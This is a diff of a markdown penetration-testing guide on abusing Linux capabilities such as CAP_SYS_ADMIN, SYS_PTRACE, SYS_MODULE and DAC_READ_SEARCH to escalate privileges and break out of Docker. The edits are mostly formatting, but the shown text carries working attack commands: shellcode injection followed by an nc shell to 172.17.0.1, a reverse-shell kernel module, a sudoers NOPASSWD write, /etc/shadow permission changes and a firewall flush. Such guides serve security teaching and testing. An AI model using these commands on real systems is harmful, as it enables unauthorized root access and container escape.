@@ -16,7 +16,7 @@ Let’s assume we are running a process as a normal user. This means we are non-
 
 **CapEff**: The _effective_ capability set represents all capabilities the process is using at the moment (this is the actual set of capabilities that the kernel uses for permission checks). For file capabilities the effective set is in fact a single bit indicating whether the capabilities of the permitted set will be moved to the effective set upon running a binary. This makes it possible for binaries that are not capability-aware to make use of file capabilities without issuing special system calls.
 
-**CapPrm**: (_Permitted_) This is a superset of capabilities that the thread may add to either the thread permitted or thread inheritable sets. The thread can use the capset() system call to manage capabilities: It may drop any capability from any set, but only add capabilities to its thread effective and inherited sets that are in its thread permitted set. Consequently it cannot add any capability to its thread permitted set, unless it has the cap_setpcap capability in its thread effective set.
+**CapPrm**: (_Permitted_) This is a superset of capabilities that the thread may add to either the thread permitted or thread inheritable sets. The thread can use the capset() system call to manage capabilities: It may drop any capability from any set, but only add capabilities to its thread effective and inherited sets that are in its thread permitted set. Consequently it cannot add any capability to its thread permitted set, unless it has the cap\_setpcap capability in its thread effective set.
 
 **CapInh**: Using the _inherited_ set all capabilities that are allowed to be inherited from a parent process can be specified. This prevents a process from receiving any capabilities it does not need. This set is preserved across an `execve` and is usually set by a process _receiving_ capabilities rather than by a process that’s handing out capabilities to its children.
 
@@ -129,7 +129,7 @@ getcap -r / 2>/dev/null
 
 ### Dropping capabilities with capsh
 
-If we drop the CAP_NET_RAW capabilities for _ping_, then the ping utility should no longer work.
+If we drop the CAP\_NET\_RAW capabilities for _ping_, then the ping utility should no longer work.
 
 ```bash
 capsh --drop=cap_net_raw --print -- -c "tcpdump"
@@ -363,9 +363,9 @@ Note that one can assign empty capability sets to a program file, and thus it is
 2. has no `SUID`/`SGID` bits set
 3. has empty capabilities set (e.g.: `getcap myelf` returns `myelf =ep`)
 
-then that binary will run as root.
+then **that binary will run as root**.
 
-### CAP_SYS_ADMIN
+### CAP\_SYS\_ADMIN
 
 **This means that you can** **mount/umount filesystems.**
 
@@ -418,7 +418,7 @@ gid=0(root)
 groups=0(root)
 ```
 
-Inside the previous output you can see that the SYS_ADMIN capability is enabled.
+Inside the previous output you can see that the SYS\_ADMIN capability is enabled.
 
 * **Mount**
 
@@ -455,7 +455,7 @@ chroot /mnt/ adduser john
 ssh john@172.17.0.1 -p 2222
 ```
 
-### CAP_SYS_PTRACE
+### CAP\_SYS\_PTRACE
 
 **This means that you can escape the container by injecting a shellcode inside some process running inside the host.**
 
@@ -574,11 +574,11 @@ List **processes** running in the **host** `ps -eaf`
 
 1. Get the **architecture** `uname -m`
 2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
-3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
+3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
 4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
 5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`
 
-### CAP_SYS_MODULE
+### CAP\_SYS\_MODULE
 
 **This means that you can** **insert/remove kernel modules in/from the kernel of the host machine.**
 
@@ -642,7 +642,7 @@ gid=0(root)
 groups=0(root)
 ```
 
-Inside the previous output you can see that the **SYS_MODULE** capability is enabled.
+Inside the previous output you can see that the **SYS\_MODULE** capability is enabled.
 
 **Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it:
 
@@ -697,7 +697,7 @@ sudo apt update
 sudo apt full-upgrade
 ```
 
- Finally, start `nc` inside a shell and **load the module** from another one and you will capture the shell in the nc process:
+&#x20;Finally, start `nc` inside a shell and **load the module** from another one and you will capture the shell in the nc process:
 
 ```bash
 #Shell 1
@@ -707,9 +707,9 @@ nc -lvnp 4444
 insmod reverse-shell.ko #Launch the reverse shell
 ```
 
-**The code of this technique was copied from the laboratory of "Abusing SYS_MODULE Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
+**The code of this technique was copied from the laboratory of "Abusing SYS\_MODULE Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
 
-### CAP_DAC_READ_SEARCH
+### CAP\_DAC\_READ\_SEARCH
 
 **This means that you can** **bypass can bypass file read permission checks and directory read/execute permission checks.**
 
@@ -758,9 +758,9 @@ gid=0(root)
 groups=0(root)
 ```
 
-Inside the previous output you can see that the **DAC_READ_SEARCH** capability is enabled. As a result, the container can **debug processes**.
+Inside the previous output you can see that the **DAC\_READ\_SEARCH** capability is enabled. As a result, the container can **debug processes**.
 
-You can learn how the following exploiting works in [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume **CAP_DAC_READ_SEARCH** not only allows us to traverse the file system without permission checks, but also explicitly removes any checks to _**open_by_handle_at(2)**_ and **could allow our process to sensitive files opened by other processes**.
+You can learn how the following exploiting works in [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume **CAP\_DAC\_READ\_SEARCH** not only allows us to traverse the file system without permission checks, but also explicitly removes any checks to _**open\_by\_handle\_at(2)**_ and **could allow our process to sensitive files opened by other processes**.
 
 The original exploit that abuse this permissions to read files from the host can be found here: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), the following is a **modified version that allows you to indicate the file you want to read as first argument and dump it in a file.**
 
@@ -916,9 +916,9 @@ I exploit needs to find a pointer to something mounted on the host. The original
 
 ![](<../../.gitbook/assets/image (407) (2).png>)
 
-**The code of this technique was copied from the laboratory of "Abusing DAC_READ_SEARCH Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
+**The code of this technique was copied from the laboratory of "Abusing DAC\_READ\_SEARCH Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
 
-### CAP_DAC_OVERRIDE
+### CAP\_DAC\_OVERRIDE
 
 **This mean that you can bypass write permission checks on any file, so you can write any file.**
 
@@ -945,7 +945,7 @@ file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
 file.close()
 ```
 
-#### Example with environment + CAP_DAC_READ_SEARCH (Docker breakout)
+#### Example with environment + CAP\_DAC\_READ\_SEARCH (Docker breakout)
 
 You can check the enabled capabilities inside the docker container using:
 
@@ -962,7 +962,7 @@ gid=0(root)
 groups=0(root)
 ```
 
-First of all read the previous section that [**abuses DAC_READ_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) of the host and **compile** the exploit.\
+First of all read the previous section that [**abuses DAC\_READ\_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap\_dac\_read\_search) of the host and **compile** the exploit.\
 Then, **compile the following version of the shocker exploit** that ill allow you to **write arbitrary files** inside the hosts filesystem:
 
 ```c
@@ -1106,9 +1106,9 @@ int main(int argc, char * argv[]) {
 
 In order to scape the docker container you could **download** the files `/etc/shadow` and `/etc/passwd` from the host, **add** to them a **new user**, and use **`shocker_write`** to overwrite them. Then, **access** via **ssh**.
 
-**The code of this technique was copied from the laboratory of "Abusing DAC_OVERRIDE Capability" from** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)
+**The code of this technique was copied from the laboratory of "Abusing DAC\_OVERRIDE Capability" from** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)
 
-### CAP_CHOWN
+### CAP\_CHOWN
 
 **This means that it's possible to change the ownership of any file.**
 
@@ -1126,7 +1126,7 @@ Or with the **`ruby`** binary having this capability:
 ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 ```
 
-### CAP_FOWNER
+### CAP\_FOWNER
 
 **This means that it's possible to change the permission of any file.**
 
@@ -1138,7 +1138,7 @@ If python has this capability you can modify the permissions of the shadow file,
 python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
 
-### CAP_SETUID
+### CAP\_SETUID
 
 **This means that it's possible to set the effective user id of the created process.**
 
@@ -1163,7 +1163,7 @@ os.setuid(0)
 os.system("/bin/bash")
 ```
 
-### CAP_SETGID
+### CAP\_SETGID
 
 **This means that it's possible to set the effective group id of the created process.**
 
@@ -1198,7 +1198,7 @@ cat /etc/shadow
 
 If **docker** is installed you could **impersonate** the **docker group** and abuse it to communicate with the [**docker socket** and escalate privileges](./#writable-docker-socket).
 
-### CAP_SETFCAP
+### CAP\_SETFCAP
 
 **This means that it's possible to set capabilities on files and processes**
 
@@ -1236,12 +1236,16 @@ python setcapability.py /usr/bin/python2.7
 ```
 
 {% hint style="warning" %}
-Note that if you set a new capability to the binary with CAP_SETFCAP, you will lose this cap.
+Note that if you set a new capability to the binary with CAP\_SETFCAP, you will lose this cap.
 {% endhint %}
 
-Once you have [SETUID capability](linux-capabilities.md#cap_setuid) you can go to it's section to see how to escalate privileges.
+Once you have [SETUID capability](linux-capabilities.md#cap\_setuid) you can go to it's section to see how to escalate privileges.
 
-### CAP_KILL
+#### Example with environment (Docker breakout)
+
+
+
+### CAP\_KILL
 
 **This means that it's possible to kill any process.** You cannot escalate privileges directly with this capability.
 
@@ -1257,7 +1261,7 @@ pgid = os.getpgid(341)
 os.killpg(pgid, signal.SIGKILL)
 ```
 
-### CAP_NET_BIND_SERVICE
+### CAP\_NET\_BIND\_SERVICE
 
 **This means that it's possible to listen in any port (even in privileged ones).** You cannot escalate privileges directly with this capability.
 
@@ -1289,7 +1293,7 @@ s.connect(('10.10.10.10',500))
 {% endtab %}
 {% endtabs %}
 
-### CAP_NET_RAW
+### CAP\_NET\_RAW
 
 **This means that it's possible to sniff traffic.** You cannot escalate privileges directly with this capability.
 
@@ -1306,7 +1310,7 @@ Note that if the **environment** is giving this capability you could also use **
 
 #### Example with binary 2
 
-The following example is **`python2`** code that can be useful to intercept traffic of the "**lo**" (**localhost**) interface. The code is from the lab "_The Basics: CAP-NET_BIND + NET_RAW_" from [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
+The following example is **`python2`** code that can be useful to intercept traffic of the "**lo**" (**localhost**) interface. The code is from the lab "_The Basics: CAP-NET\_BIND + NET\_RAW_" from [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
 
 ```python
 import socket
@@ -1352,7 +1356,7 @@ while True:
         count=count+1
 ```
 
-### CAP_NET_ADMIN + CAP_NET_RAW
+### CAP\_NET\_ADMIN + CAP\_NET\_RAW
 
 **This means that it's possible modify firewall rules.** You cannot escalate privileges directly with this capability.
 
@@ -1372,7 +1376,7 @@ import iptc
 iptc.easy.flush_table('filter')
 ```
 
-### CAP_LINUX_IMMUTABLE
+### CAP\_LINUX\_IMMUTABLE
 
 **This means that it's possible modify inode attributes.** You cannot escalate privileges directly with this capability.
 
@@ -1419,6 +1423,6 @@ sudo chattr -i file.txt
 **Other references**:
 
 * [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
-* [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.)
+* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.)
 * [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
 * [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
